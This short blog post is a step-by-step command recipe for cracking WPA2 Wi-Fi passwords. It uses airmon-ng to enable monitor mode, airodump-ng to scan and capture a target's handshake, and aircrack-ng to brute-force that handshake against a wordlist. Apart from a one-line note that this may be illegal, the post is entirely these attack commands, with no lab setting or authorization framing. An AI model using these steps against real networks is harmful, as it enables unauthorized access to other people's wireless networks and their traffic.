---
layout: post
title: "Crack WPA2 WLAN Password with aircrack-ng"
tags: [wlan]
---

**Disclaimer**: This might be illegal in some countries.

```bash
# Put WLAN device in monitoring mode
airmon-ng start wlan0

# Scan for access points
airodump-ng wlan0mon

# Capture WPA2 handshake, use $BSSID and $CHANNEL from previous scan
# Wait until airodump says 'WPA handshake: ...' in the upper right of the terminal, then press `Ctrl+c` to stop scanning
airodump-ng -c <$CHANNEL> --bssid <$BSSID> -w <$CAPTURE_FILE> wlan0mon

# Bruteforce the WPA2 handshake with aircrack-ng and a wordlist
aircrack-ng <$CAPTURE_FILE-01>.cap  -w <$WORDLIST_FILE>
```

---
